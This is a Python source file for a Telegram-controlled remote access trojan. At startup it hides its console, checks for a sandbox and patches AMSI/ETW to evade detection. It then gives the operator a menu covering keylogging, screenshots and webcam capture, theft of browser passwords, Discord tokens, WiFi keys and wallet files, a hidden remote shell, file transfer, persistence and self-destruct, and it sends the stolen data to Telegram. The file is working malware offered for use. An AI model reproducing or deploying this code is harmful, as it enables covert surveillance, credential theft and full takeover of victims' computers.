import os
import sys
import time
import logging
import tempfile
import subprocess
import random

import telebot
from telebot import types

from config import TOKEN, ADMIN_ID, CREATE_NO_WINDOW
from state import state
from anti import hide_console, sandbox_check, patch_amsi_etw
from stealers import steal_all_passwords, steal_discord_tokens, steal_wifi, grab_interesting_files
from system import (
    start_keylogger, stop_keylogger, start_clip, stop_clip,
    persist, self_destruct, take_screenshot, take_webcam, show_msg,
    clipboard_worker
)

logging.basicConfig(level=logging.WARNING, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("rat")

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
clipboard_worker.bot = bot

def get_ip_geo() -> str:
    try:
        import requests
        r = requests.get("http://ip-api.com/json/", timeout=6).json()
        return f"{r.get('query','?')} | {r.get('city','?')}, {r.get('country','?')}"
    except Exception:
        return "unknown"

def sysinfo() -> str:
    import socket
    import platform
    import psutil
    uname = platform.uname()
    return (
        f"<b>Host:</b> {socket.gethostname()}\n"
        f"<b>User:</b> {os.getlogin()}\n"
        f"<b>OS:</b> {uname.system} {uname.release}\n"
        f"<b>CPU:</b> {platform.processor()}\n"
        f"<b>RAM:</b> {round(psutil.virtual_memory().total / 1024**3, 1)} GB\n"
        f"<b>IP/Geo:</b> {get_ip_geo()}\n"
        f"<b>Path:</b> {os.path.abspath(sys.argv[0])}"
    )

def main_kb() -> types.ReplyKeyboardMarkup:
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("Info", "Screen", "Cam")
    kb.row("KL ON", "KL OFF", "Dump KL")
    kb.row("Passwords", "Discord", "WiFi")
    kb.row("Clip ON", "Clip OFF", "Grab")
    kb.row("Shell", "Download", "Upload")
    kb.row("Msg", "Persist", "Kill")
    return kb

def send_long(chat, text: str, prefix: str = "") -> None:
    full = prefix + text
    if len(full) > 3500:
        p = os.path.join(tempfile.gettempdir(), f"out_{random.randint(1000,9999)}.txt")
        with open(p, "w", encoding="utf-8") as f:
            f.write(text)
        bot.send_document(chat, open(p, "rb"))
        try:
            os.remove(p)
        except OSError:
            pass
    else:
        bot.send_message(chat, f"<code>{full}</code>")

def cmd_info(msg):
    bot.send_message(msg.chat.id, sysinfo())

def cmd_screen(msg):
    p = take_screenshot()
    bot.send_photo(msg.chat.id, open(p, "rb"))
    try:
        os.remove(p)
    except OSError:
        pass

def cmd_cam(msg):
    p = take_webcam()
    if p:
        bot.send_photo(msg.chat.id, open(p, "rb"))
        try:
            os.remove(p)
        except OSError:
            pass
    else:
        bot.send_message(msg.chat.id, "no cam")

def cmd_kl_on(msg):
    start_keylogger()
    bot.send_message(msg.chat.id, "KL on")

def cmd_kl_off(msg):
    stop_keylogger()
    bot.send_message(msg.chat.id, "KL off")

def cmd_dump_kl(msg):
    data = stop_keylogger()
    if data:
        send_long(msg.chat.id, data)
    else:
        bot.send_message(msg.chat.id, "empty")

def cmd_passwords(msg):
    bot.send_message(msg.chat.id, "collecting passwords...")
    data = steal_all_passwords()
    send_long(msg.chat.id, data)

def cmd_discord(msg):
    bot.send_message(msg.chat.id, f"<code>{steal_discord_tokens()}</code>")

def cmd_wifi(msg):
    bot.send_message(msg.chat.id, f"<code>{steal_wifi()}</code>")

def cmd_clip_on(msg):
    start_clip()
    bot.send_message(msg.chat.id, "clip on")

def cmd_clip_off(msg):
    stop_clip()
    bot.send_message(msg.chat.id, "clip off")

def cmd_grab(msg):
    files = grab_interesting_files()
    bot.send_message(msg.chat.id, f"found {len(files)}")
    for f in files[:20]:
        try:
            bot.send_document(msg.chat.id, open(f, "rb"), caption=os.path.basename(f))
        except Exception:
            pass
        time.sleep(1)

def cmd_shell(msg):
    bot.send_message(msg.chat.id, "cmd:")
    bot.register_next_step_handler(msg, do_shell)

def cmd_download(msg):
    bot.send_message(msg.chat.id, "path:")
    bot.register_next_step_handler(msg, do_download)

def cmd_upload(msg):
    bot.send_message(msg.chat.id, "send file")
    bot.register_next_step_handler(msg, do_upload)

def cmd_msg(msg):
    bot.send_message(msg.chat.id, "text:")
    bot.register_next_step_handler(msg, do_msg)

def cmd_persist(msg):
    bot.send_message(msg.chat.id, persist())

def cmd_kill(msg):
    bot.send_message(msg.chat.id, "bye")
    time.sleep(1)
    self_destruct()

COMMANDS = {
    "Info": cmd_info,
    "Screen": cmd_screen,
    "Cam": cmd_cam,
    "KL ON": cmd_kl_on,
    "KL OFF": cmd_kl_off,
    "Dump KL": cmd_dump_kl,
    "Passwords": cmd_passwords,
    "Discord": cmd_discord,
    "WiFi": cmd_wifi,
    "Clip ON": cmd_clip_on,
    "Clip OFF": cmd_clip_off,
    "Grab": cmd_grab,
    "Shell": cmd_shell,
    "Download": cmd_download,
    "Upload": cmd_upload,
    "Msg": cmd_msg,
    "Persist": cmd_persist,
    "Kill": cmd_kill,
}

@bot.message_handler(commands=["start", "help"])
def start_handler(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    bot.send_message(msg.chat.id, "ready", reply_markup=main_kb())

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID)
def cmd_handler(msg):
    text = (msg.text or "").strip()
    handler = COMMANDS.get(text)
    if handler:
        handler(msg)

def do_shell(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        out = subprocess.check_output(msg.text, shell=True, stderr=subprocess.STDOUT, timeout=60, startupinfo=si, creationflags=CREATE_NO_WINDOW)
        bot.send_message(msg.chat.id, f"<code>{out.decode(errors='ignore')[:4000]}</code>")
    except Exception as e:
        bot.send_message(msg.chat.id, str(e))

def do_download(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    path = msg.text.strip().strip('"')
    if os.path.isfile(path):
        bot.send_document(msg.chat.id, open(path, "rb"))
    else:
        bot.send_message(msg.chat.id, "not found")

def do_upload(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    if not msg.document:
        bot.send_message(msg.chat.id, "not file")
        return
    info = bot.get_file(msg.document.file_id)
    data = bot.download_file(info.file_path)
    path = os.path.join(tempfile.gettempdir(), msg.document.file_name)
    with open(path, "wb") as f:
        f.write(data)
    bot.send_message(msg.chat.id, f"saved: {path}")

def do_msg(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    show_msg(msg.text)
    bot.send_message(msg.chat.id, "shown")

if __name__ == "__main__":
    hide_console()
    sandbox_check()
    patch_amsi_etw()
    try:
        info = sysinfo()
        caps = (
            "Capabilities:\n"
            "- System info + geo\n"
            "- Screenshot / Webcam\n"
            "- Keylogger (ON/OFF/Dump)\n"
            "- Passwords (Chrome/Edge/Brave/Opera/Vivaldi/Yandex + ABE)\n"
            "- Discord tokens\n"
            "- WiFi passwords\n"
            "- Clipboard monitor\n"
            "- File grabber (docs/wallets/keys)\n"
            "- Remote shell\n"
            "- Download / Upload\n"
            "- Message box\n"
            "- Persistence (Run + Startup + Task Scheduler)\n"
            "- Self-destruct"
        )
        bot.send_message(ADMIN_ID, f"online\n{info}\n\n{caps}", reply_markup=main_kb())
    except Exception as e:
        log.warning("startup message failed: %s", e)
    bot.infinity_polling(timeout=90, long_polling_timeout=90, interval=7)
